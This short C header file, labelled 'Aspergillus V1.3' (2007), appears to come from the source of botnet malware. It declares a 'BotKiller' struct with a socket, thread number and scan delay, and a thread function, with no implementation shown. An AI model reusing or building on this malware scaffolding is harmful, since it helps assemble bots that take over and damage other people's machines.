/*
		Aspergillus V1.3 by D
		Copyright (c) 2007
*/

#ifndef NO_BOTKILLER

typedef struct BK {
	SOCKET Sock;
	int tnum;
	int ScanDelay;				
} BK;

DWORD WINAPI BotKillerThread(LPVOID param);

#endif